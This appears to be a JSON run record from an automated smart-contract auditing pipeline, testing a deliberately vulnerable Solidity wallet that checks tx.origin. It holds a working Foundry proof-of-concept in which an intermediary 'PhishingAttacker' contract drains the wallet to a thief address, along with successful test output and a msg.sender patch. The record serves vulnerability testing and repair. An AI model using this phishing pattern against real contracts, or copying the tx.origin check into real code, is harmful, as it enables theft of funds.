@@ -1,0 +1,190 @@
+{
+  "audit_passed": false,
+  "case_id": "tx-origin",
+  "cohort": "existing_demonstration_fixture",
+  "confirmed": true,
+  "controls": [],
+  "error": "ValueError: '/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin/test/SentinelExploit_a0ff782691c5ecc8.t.sol' is not in the subpath of '/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin'",
+  "repair_verified": false,
+  "runtime_state": {
+    "aderyn_result": null,
+    "alerts": [],
+    "analyzer_runs": [],
+    "ast_context": {},
+    "baseline_exploit_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--match-test",
+        "^testExploit\\(.*\\)$",
+        "--match-path",
+        "test/SentinelExploit_a0ff782691c5ecc8.t.sol",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin",
+      "duration_seconds": 0.1004091669999525,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "{\"test/SentinelExploit_a0ff782691c5ecc8.t.sol:ExploitTest\":{\"duration\":\"348\u00b5s 375ns\",\"test_results\":{\"testExploit()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":73869}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"61\u00b5s 917ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": true,
+      "timed_out": false
+    },
+    "baseline_regression_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--no-match-test",
+        "^testExploit\\(.*\\)$",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin",
+      "duration_seconds": 0.09918504199993095,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "{\"test/Functional.t.sol:FunctionalTest\":{\"duration\":\"318\u00b5s 625ns\",\"test_results\":{\"testFunctional()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":73482}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"152\u00b5s 208ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]},\"test/Wallet.t.sol:WalletTest\":{\"duration\":\"65\u00b5s\",\"test_results\":{\"testDeploy()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":6517}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"38\u00b5s 458ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": true,
+      "timed_out": false
+    },
+    "candidate_id": "heuristic-tx-origin",
+    "compilation_result": null,
+    "compiler_info": {},
+    "enabled_analyzers": [
+      "slither",
+      "mythril"
+    ],
+    "experiment_profile": "sentinel-full",
+    "exploit_artifact": {
+      "confirmed": true,
+      "execution": {
+        "command": [
+          "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+          "test",
+          "--json",
+          "--match-test",
+          "^testExploit\\(.*\\)$",
+          "--match-path",
+          "test/SentinelExploit_a0ff782691c5ecc8.t.sol",
+          "--use",
+          "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+          "--offline",
+          "--threads",
+          "1"
+        ],
+        "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin",
+        "duration_seconds": 0.1004091669999525,
+        "exit_code": 0,
+        "stderr": "",
+        "stdout": "{\"test/SentinelExploit_a0ff782691c5ecc8.t.sol:ExploitTest\":{\"duration\":\"348\u00b5s 375ns\",\"test_results\":{\"testExploit()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":73869}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"61\u00b5s 917ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+        "success": true,
+        "timed_out": false
+      },
+      "origin": "reviewed_fixture",
+      "rationale": "The PoC is restricted to the target Foundry project and testExploit.",
+      "source": "pragma solidity ^0.8.20;\n\nimport \"../src/TxOriginWallet.sol\";\n\ninterface Vm { function deal(address account, uint256 newBalance) external; function startPrank(address sender, address origin) external; function stopPrank() external; }\n\ncontract PhishingAttacker {\n    function trick(TxOriginWallet wallet, address payable recipient) external { wallet.withdraw(recipient); }\n}\n\ncontract ExploitTest {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    TxOriginWallet private wallet;\n    PhishingAttacker private attacker;\n    address private constant owner = address(0xB0B);\n    address private constant thief = address(0xA11CE);\n    function setUp() public {\n        vm.deal(owner, 1 ether);\n        vm.startPrank(owner, owner);\n        wallet = new TxOriginWallet{value: 1 ether}();\n        vm.stopPrank();\n        attacker = new PhishingAttacker();\n    }\n    function testExploit() public {\n        vm.startPrank(owner, owner);\n        attacker.trick(wallet, payable(thief));\n        vm.stopPrank();\n        require(address(wallet).balance == 0, \"tx.origin phishing was blocked\");\n    }\n}\n",
+      "test_file": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin/test/SentinelExploit_a0ff782691c5ecc8.t.sol",
+      "test_name": "testExploit",
+      "vulnerability_id": "heuristic-tx-origin"
+    },
+    "exploit_confirmed": true,
+    "exploit_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--match-test",
+        "^testExploit\\(.*\\)$",
+        "--match-path",
+        "test/SentinelExploit_a0ff782691c5ecc8.t.sol",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin",
+      "duration_seconds": 0.1004091669999525,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "{\"test/SentinelExploit_a0ff782691c5ecc8.t.sol:ExploitTest\":{\"duration\":\"348\u00b5s 375ns\",\"test_results\":{\"testExploit()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":73869}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"61\u00b5s 917ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": true,
+      "timed_out": false
+    },
+    "exploit_source": "pragma solidity ^0.8.20;\n\nimport \"../src/TxOriginWallet.sol\";\n\ninterface Vm { function deal(address account, uint256 newBalance) external; function startPrank(address sender, address origin) external; function stopPrank() external; }\n\ncontract PhishingAttacker {\n    function trick(TxOriginWallet wallet, address payable recipient) external { wallet.withdraw(recipient); }\n}\n\ncontract ExploitTest {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    TxOriginWallet private wallet;\n    PhishingAttacker private attacker;\n    address private constant owner = address(0xB0B);\n    address private constant thief = address(0xA11CE);\n    function setUp() public {\n        vm.deal(owner, 1 ether);\n        vm.startPrank(owner, owner);\n        wallet = new TxOriginWallet{value: 1 ether}();\n        vm.stopPrank();\n        attacker = new PhishingAttacker();\n    }\n    function testExploit() public {\n        vm.startPrank(owner, owner);\n        attacker.trick(wallet, payable(thief));\n        vm.stopPrank();\n        require(address(wallet).balance == 0, \"tx.origin phishing was blocked\");\n    }\n}\n",
+    "feedback": [],
+    "final_report_path": null,
+    "final_verification_state": "not_started",
+    "findings": [
+      {
+        "confidence": "unknown",
+        "confidence_score": 0.0,
+        "contract": "",
+        "description": "Existing local demonstration, not a new discovery",
+        "detector": "reviewed-fixture",
+        "evidence": [],
+        "file": "src/TxOriginWallet.sol",
+        "function": "",
+        "id": "heuristic-tx-origin",
+        "line": null,
+        "raw_output": "",
+        "semantic_context": "",
+        "severity": "unknown",
+        "source": "local-heuristic",
+        "sources": [],
+        "status": "confirmed"
+      }
+    ],
+    "gas_metrics": {},
+    "judge_result": null,
+    "max_retries": 5,
+    "mock_mode": false,
+    "mythril_results": [],
+    "natspec_context": {},
+    "novelty_assessment": {},
+    "oracle_test_hashes": {
+      "test/Functional.t.sol": "03ecfecf4b5d1b94c0c1ff72c759e80730c22f23f55fc116f261f7e65534e39c",
+      "test/SentinelExploit_a0ff782691c5ecc8.t.sol": "da8e59b27dc3af8873e7b0c8cc7c472993b6088acdd9db9f9e083df1827f8e5c",
+      "test/Wallet.t.sol": "291660abee81d402944e47c9f2af9a83c8eff3ec1d1c471316e99afdfe6422fb"
+    },
+    "original_source": {
+      "src/TxOriginWallet.sol": "pragma solidity ^0.8.20;\n\n/// @notice Deliberately vulnerable: tx.origin permits phishing through an intermediary contract.\ncontract TxOriginWallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function withdraw(address payable recipient) external {\n        require(tx.origin == owner, \"not owner\");\n        recipient.transfer(address(this).balance);\n    }\n}\n"
+    },
+    "patch_artifact": {
+      "attempt": 1,
+      "modified_lines": [],
+      "original_file": "src/TxOriginWallet.sol",
+      "patch": "--- src/TxOriginWallet.sol\n+++ src/TxOriginWallet.sol\n@@ -9,7 +9,7 @@\n     }\n \n     function withdraw(address payable recipient) external {\n-        require(tx.origin == owner, \"not owner\");\n+        require(msg.sender == owner, \"not owner\");\n         recipient.transfer(address(this).balance);\n     }\n }\n",
+      "rationale": "Only the vulnerable state-update/authorization region was changed.",
+      "vulnerability_id": "heuristic-tx-origin"
+    },
+    "patch_diff": "--- src/TxOriginWallet.sol\n+++ src/TxOriginWallet.sol\n@@ -9,7 +9,7 @@\n     }\n \n     function withdraw(address payable recipient) external {\n-        require(tx.origin == owner, \"not owner\");\n+        require(msg.sender == owner, \"not owner\");\n         recipient.transfer(address(this).balance);\n     }\n }\n",
+    "patched_source": {
+      "src/TxOriginWallet.sol": "pragma solidity ^0.8.20;\n\n/// @notice Deliberately vulnerable: tx.origin permits phishing through an intermediary contract.\ncontract TxOriginWallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function withdraw(address payable recipient) external {\n        require(msg.sender == owner, \"not owner\");\n        recipient.transfer(address(this).balance);\n    }\n}\n"
+    },
+    "project_path": "/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-tjv7c8rl/tx-origin",
+    "protocol_map": {},
+    "regression_result": null,
+    "report_artifacts": [],
+    "reproducibility": {},
+    "retry_count": 0,
+    "retry_history": [],
+    "risk_assessment": {},
+    "scout_only": false,
+    "scout_results": [],
+    "slither_result": null,
+    "source_files": [
+      "src/TxOriginWallet.sol"
+    ],
+    "workspace_path": null
+  },
+  "security_transition": false
+}
